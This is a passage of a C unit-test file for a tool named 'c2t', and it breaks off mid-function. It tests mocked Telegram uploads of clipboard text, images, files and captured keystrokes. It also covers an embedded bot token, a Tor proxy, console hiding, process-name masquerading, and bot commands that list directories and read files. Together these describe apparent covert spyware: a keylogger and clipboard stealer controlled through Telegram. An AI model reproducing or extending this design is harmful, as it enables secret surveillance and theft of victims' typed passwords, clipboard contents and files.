/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define _POSIX_C_SOURCE 200809L

#include "telegram/telegram.h"
#include "telegram/telegram_platform.h"
#include "config/config.h"
#include "clipboard/clipboard_output.h"
#include "keyboard/keyboard.h"
#include "keyboard/keyboard_output.h"
#include "crypto/crypto.h"
#include "files/files.h"
#include "logging/logging.h"
#include "logging/log_sender.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static char last_method[32];
static char last_content_type[128];
static unsigned char *last_body;
static size_t last_body_length;
static int http_init_calls;
static int http_post_calls;
static int http_post_result = 1;

static int fail(const char *message)
{
    fprintf(stderr, "FAIL: %s\n", message);
    return 1;
}

static int body_contains(const void *value, size_t length)
{
    if (length > last_body_length)
        return 0;
    for (size_t index = 0; index <= last_body_length - length; ++index) {
        if (memcmp(last_body + index, value, length) == 0)
            return 1;
    }
    return 0;
}

int telegram_http_init(void)
{
    ++http_init_calls;
    return 1;
}

int telegram_http_post([[maybe_unused]] const char *token, const char *method,
                       const char *content_type, const void *body,
                       size_t body_length)
{
    ++http_post_calls;
    snprintf(last_method, sizeof(last_method), "%s", method);
    snprintf(last_content_type, sizeof(last_content_type), "%s", content_type);
    free(last_body);
    last_body = malloc(body_length);
    if (!last_body)
        return 0;
    memcpy(last_body, body, body_length);
    last_body_length = body_length;
    return http_post_result;
}

int telegram_http_post_stream([[maybe_unused]] const char *token, const char *method,
                              const char *content_type, c2t_stream_t *stream)
{
    if (!stream || !stream->read)
        return 0;
    ++http_post_calls;
    snprintf(last_method, sizeof(last_method), "%s", method);
    snprintf(last_content_type, sizeof(last_content_type), "%s", content_type);
    free(last_body);
    last_body = malloc(stream->total_size ? stream->total_size : 1);
    if (!last_body)
        return 0;
    size_t read_bytes = stream->read(stream->user_data, last_body, stream->total_size);
    last_body_length = read_bytes;
    return http_post_result;
}

int telegram_http_get([[maybe_unused]] const char *token, const char *method_and_query,
                      char *response_out, size_t response_capacity)
{
    if (response_out && response_capacity > 0) {
        if (strstr(method_and_query, "getUpdates")) {
            snprintf(response_out, response_capacity,
                     "{\"ok\":true,\"result\":["
                     "{\"update_id\":100,\"message\":{\"from\":{\"username\":\"user1\"},\"chat\":{\"id\":-12345},\"text\":\"/status\"}},"
                     "{\"update_id\":101,\"message\":{\"from\":{\"username\":\"user2\"},\"chat\":{\"id\":-12345},\"text\":\"/logs\"}}"
                     "]}");
        } else {
            snprintf(response_out, response_capacity,
                     "{\"ok\":true,\"result\":{\"username\":\"mock_bot\",\"id\":123456,\"chat\":{\"id\":123456}}}");
        }
    }
    return 1;
}

void telegram_http_thread_cleanup(void)
{
}

void telegram_http_cleanup(void)
{
}

static int test_updates_count = 0;
static char test_last_cmd[64] = {};

static void test_callback([[maybe_unused]] int64_t update_id, [[maybe_unused]] const char *chat_id,
                          [[maybe_unused]] const char *username, const char *text,
                          [[maybe_unused]] void *user_data)
{
    test_updates_count++;
    if (text) snprintf(test_last_cmd, sizeof(test_last_cmd), "%s", text);
}

int main(void)
{
    if (getenv("C2T_EXPECT_EMBEDDED") &&
        strcmp(getenv("C2T_EXPECT_EMBEDDED"), "1") == 0) {
        unsetenv("TELEGRAM_BOT_TOKEN");
        unsetenv("TELEGRAM_CHAT_ID");
        unsetenv("C2T_PROXY");
        unsetenv("TELEGRAM_PROXY");
        c2t_config_load_environment();
        if (!c2t_config_get()->telegram_bot_token ||
            strcmp(c2t_config_get()->telegram_bot_token,
                   "987654:embedded-test-token") != 0 ||
            !c2t_config_get()->telegram_chat_id ||
            strcmp(c2t_config_get()->telegram_chat_id, "-987654") != 0 ||
            !c2t_config_get()->proxy ||
            strcmp(c2t_config_get()->proxy, "socks5://127.0.0.1:9050") != 0)
            return fail("post-link embedded Telegram configuration");
        return 0;
    }

    unsetenv("TELEGRAM_SEND_WINDOW_INFO");
    unsetenv("C2T_VERBOSE");
    c2t_config_load_environment();
    if (c2t_config_get()->telegram_send_window_info)
        return fail("window information must be disabled by default");
    setenv("TELEGRAM_SEND_WINDOW_INFO", "1", 1);
    c2t_config_load_environment();
    if (!c2t_config_get()->telegram_send_window_info)
        return fail("TELEGRAM_SEND_WINDOW_INFO must enable source metadata");
    unsetenv("TELEGRAM_SEND_WINDOW_INFO");
    c2t_config_load_environment();
    char *source_option[] = {(char *)"c2t", (char *)"--send-window-info"};
    if (c2t_config_apply_arguments(2, source_option) != NULL ||
        !c2t_config_get()->telegram_send_window_info)
        return fail("--send-window-info must enable source metadata");
    unsetenv("TELEGRAM_SEND_WINDOW_INFO");
    c2t_config_load_environment();
    c2t_log_init();
    if (c2t_log_is_verbose())
        return fail("verbose logging must be disabled by default");
    setenv("C2T_VERBOSE", "1", 1);
    c2t_config_load_environment();
    c2t_log_init();
    if (!c2t_log_is_verbose())
        return fail("C2T_VERBOSE must enable verbose logging");
    unsetenv("C2T_VERBOSE");
    c2t_config_load_environment();
    c2t_log_init();

    unsetenv("C2T_HIDE_CONSOLE");
    unsetenv("HIDE_CONSOLE");
    c2t_config_load_environment();
    if (c2t_config_get()->hide_console)
        return fail("hide_console must be disabled by default");
    setenv("C2T_HIDE_CONSOLE", "1", 1);
    c2t_config_load_environment();
    if (!c2t_config_get()->hide_console)
        return fail("C2T_HIDE_CONSOLE must enable hide_console");
    unsetenv("C2T_HIDE_CONSOLE");
    setenv("HIDE_CONSOLE", "1", 1);
    c2t_config_load_environment();
    if (!c2t_config_get()->hide_console)
        return fail("HIDE_CONSOLE must enable hide_console");
    unsetenv("HIDE_CONSOLE");
    c2t_config_load_environment();
    char *hide_option[] = {(char *)"c2t", (char *)"--hide-console"};
    if (c2t_config_apply_arguments(2, hide_option) != NULL ||
        !c2t_config_get()->hide_console)
        return fail("--hide-console must enable hide_console");

    unsetenv("C2T_PROXY");
    unsetenv("TELEGRAM_PROXY");
    c2t_config_load_environment();
    if (c2t_config_get()->proxy != nullptr)
        return fail("default proxy should be null");

    setenv("C2T_PROXY", "socks5://127.0.0.1:9050", 1);
    c2t_config_load_environment();
    if (!c2t_config_get()->proxy ||
        strcmp(c2t_config_get()->proxy, "socks5://127.0.0.1:9050") != 0)
        return fail("C2T_PROXY environment variable");
    unsetenv("C2T_PROXY");

    setenv("TELEGRAM_PROXY", "http://10.0.0.1:8080", 1);
    c2t_config_load_environment();
    if (!c2t_config_get()->proxy ||
        strcmp(c2t_config_get()->proxy, "http://10.0.0.1:8080") != 0)
        return fail("TELEGRAM_PROXY environment variable fallback");
    unsetenv("TELEGRAM_PROXY");

    char *proxy_args[] = {"c2t", "--proxy", "socks5h://localhost:1080"};
    c2t_config_load_environment();
    if (c2t_config_apply_arguments(3, proxy_args) != nullptr ||
        !c2t_config_get()->proxy ||
        strcmp(c2t_config_get()->proxy, "socks5h://localhost:1080") != 0)
        return fail("--proxy argument parsing");

    c2t_config_load_environment();

    unsetenv("TELEGRAM_ENABLED");
    c2t_config_load_environment();
    if (!telegram_init() || http_init_calls != 0)
        return fail("disabled Telegram must not require initialization");

    setenv("TELEGRAM_ENABLED", "1", 1);
    setenv("TELEGRAM_DEDUPLICATE", "1", 1);
    setenv("TELEGRAM_BOT_TOKEN", "123:test-token", 1);
    setenv("TELEGRAM_CHAT_ID", "-12345", 1);
    c2t_config_load_environment();
    if (!telegram_init() || http_init_calls != 1)
        return fail("enabled Telegram initialization");

    static const unsigned char png[] = {0x89, 'P', 'N', 'G', 0, 0xff};
    if (!telegram_send_data(png, sizeof(png), "image/png", NULL) ||
        strcmp(last_method, "sendPhoto") != 0 ||
        strncmp(last_content_type, "multipart/form-data; boundary=", 30) != 0 ||
        !body_contains(png, sizeof(png)) ||
        !body_contains("name=\"photo\"", 12))
        return fail("PNG multipart photo upload");
    if (!telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
        http_post_calls != 1)
        return fail("duplicate PNG must not be uploaded twice");

    static const unsigned char bmp[] = {'B', 'M', 0, 1};
    if (!telegram_send_data(bmp, sizeof(bmp), "image/bmp", nullptr) ||
        strcmp(last_method, "sendDocument") != 0 ||
        !body_contains("Content-Type: image/bmp", 23))
        return fail("BMP document upload");

    if (!telegram_send_data("hello world", 11,
                            "text/plain;charset=utf-8", nullptr) ||
        strcmp(last_method, "sendMessage") != 0 ||
        strcmp(last_content_type,
               "application/x-www-form-urlencoded") != 0 ||
        !body_contains("text=hello%20world", 18))
        return fail("text form upload");
    if (!telegram_send_data("hello world", 11,
                            "text/plain;charset=utf-8", nullptr) ||
        http_post_calls != 3)
        return fail("duplicate text must not be sent twice");

    static const char phone[] = "+39 333-123-4567";
    if (!telegram_send_data(phone, sizeof(phone) - 1, "text/plain", nullptr) ||
        strcmp(last_method, "sendContact") != 0 ||
        !body_contains("phone_number=%2B393331234567",
                       sizeof("phone_number=%2B393331234567") - 1) ||
        !body_contains("first_name=Clipboard",
                       sizeof("first_name=Clipboard") - 1))
        return fail("phone number contact card");
    if (!telegram_send_data(phone, sizeof(phone) - 1, "text/plain", nullptr) ||
        http_post_calls != 4)
        return fail("duplicate contact must not be sent twice");

    static const char international_phone[] = "0039 333 1234567";
    if (!telegram_send_data(international_phone,
                            sizeof(international_phone) - 1, "text/plain",
                            nullptr) ||
        strcmp(last_method, "sendContact") != 0 ||
        !body_contains("phone_number=%2B393331234567",
                       sizeof("phone_number=%2B393331234567") - 1))
        return fail("00 international prefix normalization");

    static const char local_phone[] = "3348668699";
    if (!telegram_send_data(local_phone, sizeof(local_phone) - 1,
                            "text/plain", nullptr) ||
        strcmp(last_method, "sendMessage") != 0)
        return fail("phone without international prefix must remain text");

    static const char coordinates[] = "45.4642, 9.1900";
    if (!telegram_send_data(coordinates, sizeof(coordinates) - 1,
                            "text/plain", nullptr) ||
        strcmp(last_method, "sendLocation") != 0 ||
        !body_contains("latitude=45.46420000",
                       sizeof("latitude=45.46420000") - 1) ||
        !body_contains("longitude=9.19000000",
                       sizeof("longitude=9.19000000") - 1))
        return fail("coordinate location card");

    static const char vcard[] =
        "BEGIN:VCARD\r\nVERSION:3.0\r\nFN:Mario Rossi\r\n"
        "TEL;TYPE=CELL:+39 320 1234567\r\nEND:VCARD";
    if (!telegram_send_data(vcard, sizeof(vcard) - 1, "text/vcard", nullptr) ||
        strcmp(last_method, "sendContact") != 0 ||
        !body_contains("first_name=Mario%20Rossi",
                       sizeof("first_name=Mario%20Rossi") - 1) ||
        !body_contains("vcard=BEGIN%3AVCARD",
                       sizeof("vcard=BEGIN%3AVCARD") - 1))
        return fail("vCard contact card");

    static const char url[] = "https://example.com/path";
    if (!telegram_send_data(url, sizeof(url) - 1, "text/plain", nullptr) ||
        strcmp(last_method, "sendMessage") != 0)
        return fail("URL message with native preview");

    static const unsigned char gif[] = {'G', 'I', 'F', '8', '9', 'a'};
    http_post_result = 0;
    if (telegram_send_data(gif, sizeof(gif), "image/gif", nullptr))
        return fail("failed upload result");
    http_post_result = 1;
    if (!telegram_send_data(gif, sizeof(gif), "image/gif", nullptr) ||
        http_post_calls != 11)
        return fail("failed content must remain retryable");
    if (!telegram_send_data(gif, sizeof(gif), "image/gif", nullptr) ||
        http_post_calls != 11)
        return fail("retried content must be tracked after success");

    char file_path[] = "/tmp/c2t-file-test-XXXXXX";
    int file_descriptor = mkstemp(file_path);
    static const char file_contents[] = "clipboard file contents";
    if (file_descriptor < 0 ||
        write(file_descriptor, file_contents, sizeof(file_contents) - 1) !=
            (ssize_t)(sizeof(file_contents) - 1) ||
        close(file_descriptor) != 0)
        return fail("temporary file setup");

    if (c2t_file_try_clipboard_path(file_path, strlen(file_path),
                                    "text/plain", nullptr) != C2T_FILE_NOT_HANDLED)
        return fail("file paths must be disabled by default");
    setenv("TELEGRAM_SEND_FILES", "1", 1);
    c2t_config_load_environment();
    if (c2t_file_try_clipboard_path(file_path, strlen(file_path),
                                    "text/plain", nullptr) != C2T_FILE_SENT ||
        strcmp(last_method, "sendDocument") != 0 ||
        !body_contains(file_contents, sizeof(file_contents) - 1) ||
        !body_contains("filename=\"c2t-file-test-",
                       sizeof("filename=\"c2t-file-test-") - 1))
        return fail("filesystem file upload");

    char file_uri[128];
    int uri_length = snprintf(file_uri, sizeof(file_uri), "file://%s", file_path);
    if (uri_length <= 0 || (size_t)uri_length >= sizeof(file_uri) ||
        c2t_file_try_clipboard_path(file_uri, (size_t)uri_length,
                                    "text/uri-list", nullptr) != C2T_FILE_SENT ||
        http_post_calls != 12)
        return fail("filesystem file URI deduplication");

    /* Test oversized file error notification */
    setenv("TELEGRAM_MAX_FILE_BYTES", "5", 1);
    c2t_config_load_environment();
    int oversized_posts = http_post_calls;
    if (c2t_file_try_clipboard_path(file_path, strlen(file_path),
                                    "text/plain", nullptr) != C2T_FILE_SENT ||
        http_post_calls != oversized_posts + 1 ||
        strcmp(last_method, "sendMessage") != 0 ||
        !body_contains("File%20Delivery%20Failed", sizeof("File%20Delivery%20Failed") - 1) ||
        !body_contains("exceeds%20configured%20limit", sizeof("exceeds%20configured%20limit") - 1))
        return fail("oversized file must send Telegram error notification with path and reason");
    unsetenv("TELEGRAM_MAX_FILE_BYTES");
    c2t_config_load_environment();

    /* Test non-existent explicit file URI error notification */
    static const char missing_uri[] = "file:///tmp/c2t-missing-file-test.txt";
    int missing_posts = http_post_calls;
    if (c2t_file_try_clipboard_path(missing_uri, sizeof(missing_uri) - 1,
                                    "text/uri-list", nullptr) != C2T_FILE_SENT ||
        http_post_calls != missing_posts + 1 ||
        strcmp(last_method, "sendMessage") != 0 ||
        !body_contains("File%20Delivery%20Failed", sizeof("File%20Delivery%20Failed") - 1) ||
        !body_contains("c2t-missing-file-test.txt", sizeof("c2t-missing-file-test.txt") - 1))
        return fail("missing explicit file URI must send Telegram error notification");

    /* Test plain non-file text must remain not handled (pass through as regular text) */
    static const char plain_string[] = "not a real file path string";
    if (c2t_file_try_clipboard_path(plain_string, sizeof(plain_string) - 1,
                                    "text/plain", nullptr) != C2T_FILE_NOT_HANDLED)
        return fail("plain non-file text must return C2T_FILE_NOT_HANDLED");

    /* Test explicit directory URI error notification */
    static const char dir_uri[] = "file:///tmp";
    int dir_posts = http_post_calls;
    if (c2t_file_try_clipboard_path(dir_uri, sizeof(dir_uri) - 1,
                                    "text/uri-list", nullptr) != C2T_FILE_SENT ||
        http_post_calls != dir_posts + 1 ||
        strcmp(last_method, "sendMessage") != 0 ||
        !body_contains("File%20Delivery%20Failed", sizeof("File%20Delivery%20Failed") - 1) ||
        !body_contains("directory", sizeof("directory") - 1))
        return fail("explicit directory URI must send Telegram error notification");

#ifndef _WIN32
    /* Test unreadable file (permission denied) - only effective when not running as root */
    if (geteuid() != 0 && chmod(file_path, 0000) == 0) {
        int unreadable_posts = http_post_calls;
        if (c2t_file_try_clipboard_path(file_path, strlen(file_path),
                                        "text/plain", nullptr) != C2T_FILE_SENT ||
            http_post_calls != unreadable_posts + 1 ||
            strcmp(last_method, "sendMessage") != 0 ||
            !body_contains("File%20Delivery%20Failed", sizeof("File%20Delivery%20Failed") - 1) ||
            !body_contains("Cannot%20open%20file", sizeof("Cannot%20open%20file") - 1))
            return fail("unreadable file must send Telegram error notification");
        chmod(file_path, 0600);
    }
#endif

    /* Unit tests for file management API methods */
    char file_path2[] = "/tmp/c2t-cmd-test-XXXXXX";
    int fd2 = mkstemp(file_path2);
    if (fd2 < 0) return fail("temporary file 2 setup");
    static const char file_contents2[] = "file command distinct contents 2026";
    if (write(fd2, file_contents2, sizeof(file_contents2) - 1) != (ssize_t)(sizeof(file_contents2) - 1) ||
        close(fd2) != 0) {
        unlink(file_path2);
        return fail("temporary file 2 write");
    }

    int f_posts = http_post_calls;
    if (c2t_file_send_path(file_path2, nullptr) != C2T_FILE_SENT ||
        http_post_calls != f_posts + 1 ||
        strcmp(last_method, "sendDocument") != 0 ||
        !body_contains(file_contents2, sizeof(file_contents2) - 1)) {
        unlink(file_path2);
        return fail("c2t_file_send_path with valid file");
    }
    unlink(file_path2);

    if (c2t_file_send_path(nullptr, nullptr) != C2T_FILE_ERROR ||
        c2t_file_send_path("/missing/nonexistent/file.bin", nullptr) != C2T_FILE_ERROR)
        return fail("c2t_file_send_path error cases");

    char dir_list_buf[3800] = {};
    if (!c2t_file_list_directory("/tmp", dir_list_buf, sizeof(dir_list_buf)) ||
        strstr(dir_list_buf, "Directory:") == nullptr ||
        strstr(dir_list_buf, "Total:") == nullptr)
        return fail("c2t_file_list_directory valid directory");

    if (c2t_file_list_directory("/missing/dir/123", dir_list_buf, sizeof(dir_list_buf)) != 0)
        return fail("c2t_file_list_directory non-existent directory");

    char preview_buf[3800] = {};
    if (!c2t_file_read_text_preview(file_path, preview_buf, sizeof(preview_buf), 1000) ||
        strstr(preview_buf, "File:") == nullptr ||
        strstr(preview_buf, "<pre><code>") == nullptr)
        return fail("c2t_file_read_text_preview text file");

    char info_buf[1024] = {};
    if (!c2t_file_get_info(file_path, info_buf, sizeof(info_buf)) ||
        strstr(info_buf, "Filesystem Item Info") == nullptr ||
        strstr(info_buf, "Regular File") == nullptr)
        return fail("c2t_file_get_info regular file");

    char slashless_dir[3800] = {};
    if (!c2t_file_list_directory("/tmp", slashless_dir, sizeof(slashless_dir)) ||
        strstr(slashless_dir, "Directory:") == nullptr)
        return fail("c2t_file_list_directory /tmp listing");

    if (!c2t_file_get_info("/tmp", info_buf, sizeof(info_buf)) ||
        strstr(info_buf, "Directory") == nullptr)
        return fail("c2t_file_get_info directory");

    if (unlink(file_path) != 0)
        return fail("temporary file cleanup");

    telegram_cleanup();

    unsetenv("TELEGRAM_DEDUPLICATE");
    c2t_config_load_environment();
    if (!telegram_init())
        return fail("initialization without deduplication");
    int dedup_disabled_posts = http_post_calls;
    if (!telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
        !telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
        http_post_calls != dedup_disabled_posts + 2)
        return fail("duplicates must be sent when deduplication is disabled");

    static const char short_number[] = "123456";
    if (!telegram_send_data(short_number, sizeof(short_number) - 1,
                            "text/plain", nullptr) ||
        strcmp(last_method, "sendMessage") != 0)
        return fail("short numeric text must not become a contact");
    static const char invalid_coordinates[] = "91.0000, 9.1900";
    if (!telegram_send_data(invalid_coordinates,
                            sizeof(invalid_coordinates) - 1, "text/plain",
                            nullptr) ||
        strcmp(last_method, "sendMessage") != 0)
        return fail("invalid coordinates must remain text");

    telegram_cleanup();

    setenv("TELEGRAM_DEDUPLICATE", "1", 1);
    c2t_config_load_environment();
    if (!telegram_init())
        return fail("source metadata test initialization");
    c2t_clipboard_source_t source = {
        .application = "Firefox",
        .title = "Example\npage",
        .process_id = 4242
    };
    int source_posts = http_post_calls;
    static const char source_message[] = "unique source text";
    if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                            "text/plain", &source) ||
        http_post_calls != source_posts + 1 ||
        !body_contains("text=Source%3A%20Firefox%20%7C%20Example%20page%20%7C%20"
                       "PID%204242%0A%0Aunique%20source%20text",
                       sizeof("text=Source%3A%20Firefox%20%7C%20Example%20page%20"
                              "%7C%20PID%204242%0A%0Aunique%20source%20text") - 1))
        return fail("text source metadata formatting");
    if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                            "text/plain", &source) ||
        http_post_calls != source_posts + 1)
        return fail("same content and source must be deduplicated");
    snprintf(source.title, sizeof(source.title), "%s", "Another window");
    if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                            "text/plain", &source) ||
        http_post_calls != source_posts + 2)
        return fail("different source windows must remain distinguishable");

    static const unsigned char source_png[] = {0x89, 'P', 'N', 'G', 1};
    if (!telegram_send_data(source_png, sizeof(source_png), "image/png",
                            &source) ||
        strcmp(last_method, "sendPhoto") != 0 ||
        !body_contains("name=\"caption\"", sizeof("name=\"caption\"") - 1) ||
        !body_contains("Source: Firefox | Another window | PID 4242",
                       sizeof("Source: Firefox | Another window | PID 4242") - 1))
        return fail("file source metadata caption");

    static const char queued_message[] = "asynchronous clipboard delivery";
    setenv("C2T_QUEUE_MAX_BYTES", "1", 1);
    c2t_config_load_environment();
    int rejected_posts = http_post_calls;
    if (!clipboard_output_init())
        return fail("bounded clipboard queue initialization");
    clipboard_output(queued_message, sizeof(queued_message) - 1,
                     "text/plain", &source);
    clipboard_output_cleanup();
    if (http_post_calls != rejected_posts)
        return fail("oversized clipboard queue event must be rejected");

    unsetenv("C2T_QUEUE_MAX_BYTES");
    c2t_config_load_environment();
    int queued_posts = http_post_calls;
    if (!clipboard_output_init())
        return fail("clipboard delivery worker initialization");
    clipboard_output(queued_message, sizeof(queued_message) - 1,
                     "text/plain", &source);
    clipboard_output_cleanup();
    if (http_post_calls != queued_posts + 1 ||
        !body_contains("asynchronous%20clipboard%20delivery",
                       sizeof("asynchronous%20clipboard%20delivery") - 1))
        return fail("asynchronous clipboard delivery");

    setenv("C2T_DELIVERY_ATTEMPTS", "3", 1);
    setenv("C2T_RETRY_DELAY_MS", "1", 1);
    c2t_config_load_environment();
    int retry_posts = http_post_calls;
    static const char retry_message[] = "retry clipboard delivery";
    http_post_result = 0;
    if (!clipboard_output_init())
        return fail("retry worker initialization");
    clipboard_output(retry_message, sizeof(retry_message) - 1,
                     "text/plain", &source);
    clipboard_output_cleanup();
    http_post_result = 1;
    if (http_post_calls != retry_posts + 3)
        return fail("bounded delivery retry count");
    unsetenv("C2T_DELIVERY_ATTEMPTS");
    unsetenv("C2T_RETRY_DELAY_MS");
    c2t_config_load_environment();

    int cache_posts = http_post_calls;
    char cache_message[32];
    for (size_t index = 0; index <= 1024; ++index) {
        int cache_length = snprintf(cache_message, sizeof(cache_message),
                                    "dedup-cache-%llu",
                                    (unsigned long long)index);
        if (cache_length <= 0 ||
            !telegram_send_data(cache_message, (size_t)cache_length,
                                "text/plain", nullptr))
            return fail("bounded deduplication cache population");
    }
    static const char evicted_message[] = "dedup-cache-0";
    if (!telegram_send_data(evicted_message, sizeof(evicted_message) - 1,
                            "text/plain", nullptr) ||
        http_post_calls != cache_posts + 1026)
        return fail("oldest deduplication entry must be evicted");

    setenv("TELEGRAM_SEND_LOGS", "1", 1);
    setenv("TELEGRAM_LOG_INTERVAL_SEC", "10", 1);
    c2t_config_load_environment();
    if (c2t_config_get()->telegram_send_logs != 1 ||
        c2t_config_get()->telegram_log_interval_sec != 10)
        return fail("telegram_send_logs and interval configuration parsing");
    if (!c2t_log_sender_init())
        return fail("log sender initialization");
    c2t_log_sender_cleanup();
    unsetenv("TELEGRAM_SEND_LOGS");
    unsetenv("TELEGRAM_LOG_INTERVAL_SEC");
    c2t_config_load_environment();

    if (!telegram_send_html("<b>Test Log</b>"))
        return fail("telegram_send_html execution");
    if (strcmp(last_method, "sendMessage") != 0 || !body_contains("parse_mode=HTML", 15))
        return fail("telegram_send_html payload");

    clipboard_set_paused(1);
    if (!clipboard_is_paused())
        return fail("clipboard_set_paused(1)");
    if (clipboard_toggle_paused() != 0 || clipboard_is_paused() != 0)
        return fail("clipboard_toggle_paused()");
    clipboard_set_paused(0);

    keyboard_set_paused(1);
    if (!keyboard_is_paused())
        return fail("keyboard_set_paused(1)");
    if (keyboard_toggle_paused() != 0 || keyboard_is_paused() != 0)
        return fail("keyboard_toggle_paused()");
    keyboard_set_paused(0);

    /* Keyboard configuration tests */
    unsetenv("C2T_DISABLE_KEYBOARD");
    unsetenv("C2T_KEYBOARD_FLUSH_MS");
    c2t_config_load_environment();
    if (c2t_config_get()->disable_keyboard != 0 ||
        c2t_config_get()->keyboard_flush_ms != 3000)
        return fail("default keyboard configuration values");

    setenv("C2T_DISABLE_KEYBOARD", "1", 1);
    setenv("C2T_KEYBOARD_FLUSH_MS", "2500", 1);
    c2t_config_load_environment();
    if (c2t_config_get()->disable_keyboard != 1 ||
        c2t_config_get()->keyboard_flush_ms != 2500)
        return fail("custom keyboard configuration env parsing");

    char *kb_args[] = {(char *)"c2t", (char *)"--no-keyboard", (char *)"--keyboard-flush-ms", (char *)"1500"};
    unsetenv("C2T_DISABLE_KEYBOARD");
    unsetenv("C2T_KEYBOARD_FLUSH_MS");
    c2t_config_load_environment();
    if (c2t_config_apply_arguments(4, kb_args) != nullptr ||
        c2t_config_get()->disable_keyboard != 1 ||
        c2t_config_get()->keyboard_flush_ms != 1500)
        return fail("keyboard cli arguments parsing");

    unsetenv("C2T_DISABLE_KEYBOARD");
    unsetenv("C2T_KEYBOARD_FLUSH_MS");
    c2t_config_load_environment();

#ifdef C2T_ENABLE_PROCESS_MASQUERADE
    /* Process name configuration tests */
    unsetenv("C2T_DAEMON_NAME");
    unsetenv("C2T_SUPERVISOR_NAME");
    c2t_config_load_environment();
    if (strcmp(c2t_config_get()->daemon_name, "c2t") != 0 ||
        strcmp(c2t_config_get()->supervisor_name, "t2c") != 0)
        return fail("default process names");

    setenv("C2T_DAEMON_NAME", "mydaemon", 1);
    setenv("C2T_SUPERVISOR_NAME", "mysup", 1);
    c2t_config_load_environment();
    if (strcmp(c2t_config_get()->daemon_name, "mydaemon") != 0 ||
        strcmp(c2t_config_get()->supervisor_name, "mysup") != 0)
        return fail("custom process names env parsing");

    char *proc_args[] = {(char *)"c2t", (char *)"--daemon-name", (char *)"clidaemon", (char *)"--supervisor-name", (char *)"clisup"};
    unsetenv("C2T_DAEMON_NAME");
    unsetenv("C2T_SUPERVISOR_NAME");
    c2t_config_load_environment();
    if (c2t_config_apply_arguments(5, proc_args) != nullptr ||
        strcmp(c2t_config_get()->daemon_name, "clidaemon") != 0 ||
        strcmp(c2t_config_get()->supervisor_name, "clisup") != 0)
        return fail("process name cli arguments parsing");

    unsetenv("C2T_DAEMON_NAME");
    unsetenv("C2T_SUPERVISOR_NAME");
    c2t_config_load_environment();
#endif

    /* Keyboard output worker and batch flush test */
    int kb_posts = http_post_calls;
    if (!keyboard_output_init())
        return fail("keyboard_output_init");
    keyboard_output_append("test_keystrokes", 15);
    keyboard_output_flush();
    keyboard_output_cleanup();
    if (http_post_calls != kb_posts + 1)
        return fail("keyboard_output_flush asynchronous delivery");

    /* Keyboard device listing and selection tests */
    char dev_list_buf[2048];
    if (!keyboard_get_device_list(dev_list_buf, sizeof(dev_list_buf)))
        return fail("keyboard_get_device_list execution");
    if (strstr(dev_list_buf, "Keyboard") == nullptr)
        return fail("keyboard_get_device_list output content");

    (void)keyboard_select_device("0");
    char selected_target_buf[64] = {};
    keyboard_get_selected_target(selected_target_buf, sizeof(selected_target_buf));
    if (strcmp(selected_target_buf, "0") != 0)
        return fail("keyboard_select_device index");

    (void)keyboard_select_device("all");
    keyboard_get_selected_target(selected_target_buf, sizeof(selected_target_buf));
    if (strcmp(selected_target_buf, "all") != 0)
        return fail("keyboard_select_device all");

    /* Keyboard format mode tests */
    keyboard_set_format_mode(KEYBOARD_MODE_RAW);
    if (keyboard_get_format_mode() != KEYBOARD_MODE_RAW)
        return fail("keyboard_set_format_mode RAW");
    keyboard_set_format_mode(KEYBOARD_MODE_CODE);
    if (keyboard_get_format_mode() != KEYBOARD_MODE_CODE)
        return fail("keyboard_set_format_mode CODE");

    char kb_status_buf[1024];
    keyboard_get_status_info(kb_status_buf, sizeof(kb_status_buf));
    if (strstr(kb_status_buf, "Keyboard Listener Status") == nullptr)
        return fail("keyboard_get_status_info output");

    /* Test formatted keyboard delivery */
    const char *test_keystrokes_html = "echo <hello> & 'world' [Enter]";
    if (!telegram_send_keyboard(test_keystrokes_html, strlen(test_keystrokes_html)))
        return fail("telegram_send_keyboard execution");
    if (!body_contains("%26lt%3Bhello%26gt%3B", sizeof("%26lt%3Bhello%26gt%3B") - 1) ||
        !body_contains("%26amp%3B", sizeof("%26amp%3B") - 1) ||
        !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
        return fail("telegram_send_keyboard HTML escaping and code block");

    keyboard_set_format_mode(KEYBOARD_MODE_RAW);
    if (!telegram_send_keyboard("raw_keys", 8))
        return fail("telegram_send_keyboard raw mode");
    keyboard_set_format_mode(KEYBOARD_MODE_CODE);

    /* Test encrypted keyboard delivery through telegram_send_encrypted_data */
    unsigned char kb_nonce[C2T_CRYPTO_NONCE_SIZE];
    if (!c2t_crypto_get_random_bytes(kb_nonce, sizeof(kb_nonce)))
        return fail("generate kb nonce");
    const char *kb_plain = "sudo apt update && sudo apt upgrade [Enter]";
    size_t kb_plain_len = strlen(kb_plain);
    unsigned char kb_cipher[128];
    if (!c2t_crypto_encrypt(kb_plain, kb_plain_len, kb_nonce, kb_cipher))
        return fail("encrypt kb payload");
    if (!telegram_send_encrypted_data(kb_cipher, kb_plain_len, kb_nonce, C2T_KEYBOARD_MIME_TYPE, nullptr))
        return fail("telegram_send_encrypted_data for keyboard");
    if (!body_contains("sudo%20apt%20update", sizeof("sudo%20apt%20update") - 1) ||
        !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
        return fail("encrypted keyboard delivery content verification");





    int64_t test_offset = 0;
    int polled = telegram_poll_updates_callback("123:test-token", &test_offset, 0,
                                               test_callback, nullptr);
    if (polled != 2 || test_updates_count != 2 || test_offset != 102 ||
        strcmp(test_last_cmd, "/logs") != 0) {
        return fail("telegram_poll_updates_callback batch processing");
    }

    if (telegram_poll_updates_callback(nullptr, &test_offset, 0, test_callback, nullptr) != -1) {
        return fail("telegram_poll_updates_callback null token must return -1");
